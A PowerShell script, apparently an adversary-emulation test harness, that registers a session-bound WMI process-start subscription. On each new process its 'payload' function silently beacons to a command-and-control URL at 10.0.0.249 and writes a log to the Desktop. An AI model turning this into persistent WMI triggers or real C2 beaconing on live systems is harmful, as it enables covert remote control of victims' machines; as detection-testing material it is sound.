# Temporary test harness to register a session-based WMI subscription
# Writes a log to the current user's Desktop when a new process is created.

$Global:C2Url = "http://10.0.0.249:8080"
$Global:UniqueId = [System.Guid]::NewGuid().ToString().Substring(0,8)
$desktopPath = [Environment]::GetFolderPath('Desktop')
$source = "DemoWmi_test_$($Global:UniqueId)"

function Invoke-WmiPayloadAction {
    try {
        # Attempt beacon (silently)
        Invoke-RestMethod -Uri "$Global:C2Url/?message=how-are-you-session=$Global:UniqueId" -Method Get -ErrorAction SilentlyContinue
        Add-Content -Path (Join-Path $desktopPath 'calcLOG.txt') -Value "Executed payload at $(Get-Date -Format o) by session $Global:UniqueId" -ErrorAction SilentlyContinue
    } catch { }
}

$query = "SELECT * FROM Win32_ProcessStartTrace"

if (Get-Command -Name Register-CimIndicationEvent -ErrorAction SilentlyContinue) {
    Register-CimIndicationEvent -Namespace 'root\cimv2' -Query $query -SourceIdentifier $source -Action { Invoke-WmiPayloadAction } -ErrorAction Stop
    Write-Host "Registered session-based WMI subscription (Cim) with SourceIdentifier: $source"
}
elseif (Get-Command -Name Register-WmiEvent -ErrorAction SilentlyContinue) {
    Register-WmiEvent -Query $query -SourceIdentifier $source -Action { Invoke-WmiPayloadAction } -Namespace 'root\cimv2' -ErrorAction Stop
    Write-Host "Registered session-based WMI subscription (Wmi) with SourceIdentifier: $source"
}
else {
    Write-Error "No session-based WMI registration cmdlets available on this host."
    exit 1
}

Write-Host "Subscription registered. Trigger a new process (e.g., Start-Process calc.exe) from another shell to test."
Write-Host "Press Enter to exit and remove session subscriptions (subscriptions are session-bound)."
Read-Host

# Cleanup: unregister by SourceIdentifier
try { Unregister-Event -SourceIdentifier $source -ErrorAction SilentlyContinue } catch {}
try { Unregister-CimIndicationEvent -SourceIdentifier $source -ErrorAction SilentlyContinue } catch {}
Write-Host "Exited test harness."